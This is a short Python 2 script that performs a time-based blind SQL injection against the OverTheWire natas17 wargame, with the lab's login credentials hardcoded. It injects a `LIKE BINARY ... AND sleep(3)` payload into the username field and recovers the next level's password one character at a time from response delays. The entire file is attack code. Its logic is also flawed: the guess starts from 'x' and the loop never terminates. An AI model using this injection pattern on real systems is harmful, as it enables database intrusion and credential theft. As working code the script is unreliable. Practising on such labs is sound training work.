import requests

brute = 'abcdefghikjlmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
url = 'http://natas17.natas.labs.overthewire.org'
username = 'natas17'
passw = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
password = 'x'
while(True):
	for ch in brute :
		data = { 'username':'natas18" AND password LIKE BINARY "'+password+ch+'%" AND sleep(3) # ' }
		#data = { 'username':'natas18" AND password LIKE "b%" ' }
		# $query = "SELECT * from users where username= "username" ";

		r = requests.post(url,data,auth=(username, passw))
		response = r.text
		#print r.text
		a = r.elapsed.total_seconds()
		print "time elapsed: %f" %a
		if(a > 3.00) :
			password=password+ch

		print password
		print "trying with "+password+ch